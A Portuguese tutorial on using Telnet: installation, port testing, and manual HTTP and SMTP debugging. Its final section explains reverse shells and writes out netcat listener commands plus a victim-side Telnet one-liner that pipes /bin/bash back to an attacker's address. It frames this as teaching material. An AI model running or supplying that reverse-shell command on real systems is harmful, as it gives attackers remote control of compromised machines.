# Telnet

## Introdução

Telnet é um protocolo de rede usado para fornecer comunicação interativa com outros sistemas através de uma conexão de linha de comando. Apesar de sua popularidade ter diminuído em favor de métodos mais seguros como o SSH, ele ainda é útil em testes de rede, depuração, e administração de sistemas em ambientes controlados. No entanto, Telnet não oferece criptografia, o que o torna inseguro para ambientes de produção.

## Instalação do Telnet

### Instalação no Linux

Na maioria das distribuições Linux, o cliente Telnet pode ser instalado a partir dos repositórios padrão.

- **Debian/Ubuntu**:
  ```bash
  sudo apt-get install telnet
  ```

- **CentOS/RHEL**:
  ```bash
  sudo yum install telnet
  ```

### Instalação no macOS

Telnet foi removido de versões recentes do macOS, mas pode ser instalado via Homebrew:

```bash
brew install telnet
```

### Verificando a Instalação

Para verificar se o Telnet foi instalado corretamente, você pode rodar:

```bash
telnet
```

Se o comando Telnet estiver disponível, ele exibirá a mensagem de uso e comandos disponíveis.

## Usos Básicos do Telnet

### Conectando-se a um Servidor Remoto

A sintaxe básica do Telnet é conectar-se a um servidor remoto em uma porta específica. Isso é útil para testar se uma determinada porta está aberta e ativa.

#### Exemplo:
Conectando-se a um servidor na porta 80 (HTTP):
```bash
telnet example.com 80
```

Ao conectar-se à porta 80, você pode manualmente enviar comandos HTTP para o servidor.

#### Exemplo de Comando HTTP:
Após a conexão via Telnet, envie uma requisição HTTP:
```
GET / HTTP/1.1
Host: example.com
```

Isso retornará a página inicial do servidor web.

### Testando Conectividade de Porta

Telnet é frequentemente usado para verificar se uma porta específica está aberta em um servidor remoto. Se você precisar testar a conectividade com um servidor em uma porta (por exemplo, para verificar se um serviço está rodando), use:

```bash
telnet <endereço IP> <porta>
```
#### Exemplo:
Testando se a porta 22 (SSH) está aberta em um servidor:
```bash
telnet 192.168.1.10 22
```

Se a conexão for bem-sucedida, o Telnet exibirá uma tela em branco ou mensagens do servidor. Se a porta estiver fechada ou bloqueada, você verá um erro de conexão.

### Usando Telnet para Depuração

Telnet é uma ferramenta útil para depuração de servidores de e-mail (SMTP), servidores FTP, e outros serviços baseados em texto.

#### Exemplo:
Conectando-se a um servidor SMTP na porta 25:
```bash
telnet mail.example.com 25
```

Isso permitirá que você interaja com o servidor SMTP, enviando comandos como `HELO`, `MAIL FROM`, e `RCPT TO` para depuração de envios de e-mail.

## Reverse Shell com Telnet

### O que é Reverse Shell?
Em um **reverse shell**, o atacante se torna o "servidor" que escuta em uma porta, enquanto a máquina comprometida (vítima) se conecta de volta ao atacante, criando uma sessão shell. Isso pode ser útil para contornar firewalls que bloqueiam conexões de entrada.

### Como Configurar um Reverse Shell com Netcat

No sistema do atacante (que quer receber a conexão) abra duas portas para escutar o servidor alvo:

```bash
nc -lvp 1234
```
```bash
nc -lvp 4321
```

No sistema da vítima (máquina comprometida), execute o seguinte comando para enviar uma conexão de shell de volta para o atacante:

```bash
telnet 192.168.0.1 1234 | /bin/bash | telnet 192.168.0.1 4321
```

Isso permite que os comandos executados na porta 1234 sejam respondidos na porta 4321.

#### Conectando-se ao Reverse Shell

No sistema do atacante, após executar o Netcat, ele receberá automaticamente uma conexão da vítima e terá acesso à shell.

#### Riscos de Segurança
Um reverse shell é mais difícil de detectar, pois a conexão é iniciada a partir do sistema comprometido, e muitos firewalls permitem conexões de saída. No entanto, é possível monitorar tais conexões com ferramentas de monitoramento de rede.